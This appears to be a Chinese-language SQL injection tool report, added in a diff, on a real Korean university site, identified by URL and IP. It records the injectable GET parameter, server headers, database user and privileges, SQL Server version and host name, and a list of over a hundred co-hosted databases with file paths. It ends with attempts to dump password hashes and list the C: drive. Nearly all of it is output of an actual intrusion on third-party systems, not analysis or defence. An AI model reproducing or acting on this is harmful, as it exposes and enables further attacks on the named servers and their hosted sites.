@@ -1,0 +1,191 @@
+■漏洞信息:============================================================
+ ·URL:http://venture.dmc.ac.kr/board/content.asp?id=4&idx=46779
+ ·页面标题：⑵ 措备固贰措切芒诀焊腊季磐 ⑵
+ ·参数:id=4&idx=46779
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.233.3.108
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 05:47:44 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 16060
+Content-Type: text/html
+Set-Cookie: readboard46779=yes; path=/
+Set-Cookie: ASPSESSIONIDSATSDBCA=OPHHMIHABEAFLJBBHOCLDEEG; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：dmc
+- 用户名：n_dmc
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：KIDC-TEST1
+- 服务名：MSSQLSERVER
+- 系统用户名：n_dmc
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+abtech	F:\MSSQL\Data\abtech_Data.MDF	
+acs	F:\MSSQL\Data\acs_Data.MDF	
+adhong	C:\Program Files\Microsoft SQL Server\MSSQL\data\adhong_Data.MDF	
+air	F:\MSSQL\Data\air_Data.MDF	
+ajiya	F:\MSSQL\Data\ajiya_Data.MDF	
+altx	F:\MSSQL\Data\altx_Data.MDF	
+artian	F:\MSSQL\Data\artian_Data.MDF	
+automaru	C:\Program Files\Microsoft SQL Server\MSSQL\Data\automaru_Data.MDF	
+autosticker	F:\MSSQL\Data\autosticker_Data.MDF	
+bioforum	C:\Program Files\Microsoft SQL Server\MSSQL\Data\bioforum_Data.MDF	
+carclean	F:\MSSQL\Data\carclean_Data.MDF	
+carmat	F:\MSSQL\Data\carmat_Data.MDF	
+carskin	C:\Program Files\Microsoft SQL Server\MSSQL\data\carskin_Data.MDF	
+catomedia	C:\Program Files\Microsoft SQL Server\MSSQL\data\catomedia_Data.MDF	
+cb	C:\Program Files\Microsoft SQL Server\MSSQL\data\cb_Data.MDF	
+cg03029	F:\MSSQL\Data\cg03029_Data.MDF	
+chunhae	F:\MSSQL\Data\chunhae_Data.MDF	
+chunwoon	F:\MSSQL\Data\chunwoon_Data.MDF	
+citec	C:\Program Files\Microsoft SQL Server\MSSQL\Data\citec_Data.MDF	
+cmt	F:\MSSQL\Data\cmt_Data.MDF	
+cmtchina	F:\MSSQL\Data\cmtchina_Data.MDF	
+colorfulfood08	C:\Program Files\Microsoft SQL Server\MSSQL\Data\colorfulfood08_Data.MDF	
+cowso	F:\MSSQL\Data\cowso_Data.MDF	
+daegucvb	F:\MSSQL\Data\daegucvb.MDF	
+daegucvb_e	F:\MSSQL\Data\daegucvb_e.MDF	
+daegudent	F:\MSSQL\Data\daegudent_Data.MDF	
+dal1000	C:\Program Files\Microsoft SQL Server\MSSQL\data\dal1000_Data.MDF	
+dalseocenter	F:\MSSQL\Data\dalseocenter_Data.MDF	
+dawon	F:\MSSQL\Data\dawon_Data.MDF	
+dcvb_webzine	C:\Program Files\Microsoft SQL Server\MSSQL\data\dcvb_webzine_Data.MDF	
+dcvb_webzine_eng	C:\Program Files\Microsoft SQL Server\MSSQL\data\dcvb_webzine_eng_Data.MDF	
+dgbio	F:\MSSQL\Data\dgbio_Data.MDF	
+dgscience08	C:\Program Files\Microsoft SQL Server\MSSQL\data\dgscience08_Data.MDF	
+discok	F:\MSSQL\Data\discok_Data.MDF	
+dmc	F:\MSSQL\Data\dmc_Data.MDF	
+dongseodev_co_kr	F:\MSSQL\Data\dongseodev_co_kr_Data.MDF	
+dupli	F:\MSSQL\Data\dupli_Data.MDF	
+dys	F:\MSSQL\Data\dys_Data.MDF	
+echunjin	F:\MSSQL\Data\echunjin_Data.MDF	
+emma	C:\Program Files\Microsoft SQL Server\MSSQL\data\emma_Data.MDF	
+enzbio	F:\MSSQL\Data\enzbio_Data.MDF	
+excopia	F:\MSSQL\Data\excopia_Data.MDF	
+four-season_new	F:\MSSQL\Data\four-season_new_Data.MDF	
+gardenhotel	F:\MSSQL\Data\gardenhotel_Data.MDF	
+gb	F:\MSSQL\Data\gb_Data.MDF	
+gbfc	C:\Program Files\Microsoft SQL Server\MSSQL\data\gbfc_Data.MDF	
+ggumiza	F:\MSSQL\Data\ggumiza_Data.MDF	
+gobul	F:\MSSQL\Data\gobul_Data.MDF	
+greenmcs1	F:\MSSQL\Data\greenmcs1.MDF	
+hanbo	C:\Program Files\Microsoft SQL Server\MSSQL\data\hanbo_Data.MDF	
+hansolschool	C:\Program Files\Microsoft SQL Server\MSSQL\data\hansolschool.mdf	
+igagubox	F:\MSSQL\Data\igagubox_Data.MDF	
+iloveangel	F:\MSSQL\Data\iloveangel_Data.MDF	
+ilweol	F:\MSSQL\Data\ilweol_Data.MDF	
+indian	F:\MSSQL\Data\indian_Data.MDF	
+iworldmat	C:\Program Files\Microsoft SQL Server\MSSQL\data\iworldmat_Data.MDF	
+jccorp	C:\Program Files\Microsoft SQL Server\MSSQL\data\jccorp_Data.MDF	
+jhtent	F:\MSSQL\Data\jhtent_Data.MDF	
+jmwood	F:\MSSQL\Data\jmwood_Data.MDF	
+kabo	F:\MSSQL\Data\kabo_Data.MDF	
+kalla07	F:\MSSQL\Data\kalla07_Data.MDF	
+kbcp	F:\MSSQL\Data\kbcp_Data.MDF	
+kbtour	C:\Program Files\Microsoft SQL Server\MSSQL\data\kbtour_Data.MDF	
+kingnqueen	F:\MSSQL\Data\kingnqueen_Data.MDF	
+koreacarshop	F:\MSSQL\Data\koreacarshop_Data.MDF	
+koreagas	F:\MSSQL\Data\koreagas_Data.MDF	
+koreapss	F:\MSSQL\Data\koreapss_Data.MDF	
+krgas	F:\MSSQL\Data\krgas_Data.MDF	
+krsail	F:\MSSQL\Data\krsail_Data.MDF	
+livex08	C:\Program Files\Microsoft SQL Server\MSSQL\data\livex08_Data.MDF	
+lnf	F:\MSSQL\Data\lnf_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+med48	C:\Program Files\Microsoft SQL Server\MSSQL\data\med48_Data.MDF	
+mmat	F:\MSSQL\Data\mmat_Data.MDF	
+mmgdol	F:\MSSQL\Data\mmgdol_Data.MDF	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+movie	F:\MSSQL\Data\movie_Data.MDF	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+namsandong	F:\MSSQL\Data\namsandong_Data.MDF	
+nanaroom	C:\Program Files\Microsoft SQL Server\MSSQL\Data\nanaroom_Data.MDF	
+nasum	F:\MSSQL\Data\nasum_Data.MDF	
+nolja	C:\Program Files\Microsoft SQL Server\MSSQL\data\nolja_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+nosa	C:\Program Files\Microsoft SQL Server\MSSQL\data\nosa_Data.MDF	
+oagagu	F:\MSSQL\Data\oagagu_Data.MDF	
+omr	F:\MSSQL\Data\omr_Data.MDF	
+omr_school	F:\MSSQL\Data\omr_school_Data.MDF	
+peacetour_new	F:\MSSQL\Data\peacetour_new_Data.MDF	
+plasticbolt	F:\MSSQL\Data\plasticbolt_Data.MDF	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+ropeway	F:\MSSQL\Data\ropeway_Data.MDF	
+rosebeauty	C:\Program Files\Microsoft SQL Server\MSSQL\data\rosebeauty_Data.MDF	
+royalcar1	F:\MSSQL\Data\royalcar1.MDF	
+sadmo	F:\MSSQL\Data\sadmo_Data.MDF	
+saimdangtg_co_kr	F:\MSSQL\Data\saimdangtg_co_kr_Data.MDF	
+sndfarm	C:\Program Files\Microsoft SQL Server\MSSQL\data\sndfarm_Data.MDF	
+ssfa	F:\MSSQL\Data\ssfa_Data.MDF	
+ssmother	C:\Program Files\Microsoft SQL Server\MSSQL\data\ssmother.mdf	
+taegu-fh_research	F:\MSSQL\Data\taegu-fh_research_Data.MDF	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+tgfh	F:\MSSQL\Data\tgfh_Data.MDF	
+tntmotors	F:\MSSQL\Data\tntmotors_Data.MDF	
+topbj	C:\Program Files\Microsoft SQL Server\MSSQL\data\topbj_Data.MDF	
+topcanopy	F:\MSSQL\Data\topcanopy_Data.MDF	
+top-motors	F:\MSSQL\Data\top-motors_Data.MDF	
+tpy	F:\MSSQL\Data\tpy_Data.MDF	
+twomanshop	F:\MSSQL\Data\twomanshop_Data.MDF	
+vftech	C:\Program Files\Microsoft SQL Server\MSSQL\data\vftech_Data.MDF	
+winpasan	F:\MSSQL\Data\winpasan_Data.MDF	
+withcotton	F:\MSSQL\Data\withcotton.MDF	
+ychilbo	F:\MSSQL\Data\ychilbo_Data.MDF	
+zipcode	C:\Program Files\Microsoft SQL Server\MSSQL\Data\zipcode_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Microsoft㈢ Windows㈢ Operating System	sleeping	IKNOWI-3BA04982	2340	AWAITING COMMAND		
+Microsoft㈢ Windows㈢ Operating System	runnable	IKNOWI-3BA04982	2340	SELECT		
+Microsoft㈢ Windows㈢ Operating System	runnable	IKNOWI-3BA04982	2340	SELECT		
+Internet Information Services	runnable	IKNOWI108	3892	SELECT		
+Internet Information Services	runnable	IKNOWI108	3892	SELECT		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+KIDC-TEST1	SQL Server	SQLOLEDB	KIDC-TEST1		KIDC-TEST1	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of C:: 
+一次性获取失败，正在批次获取……
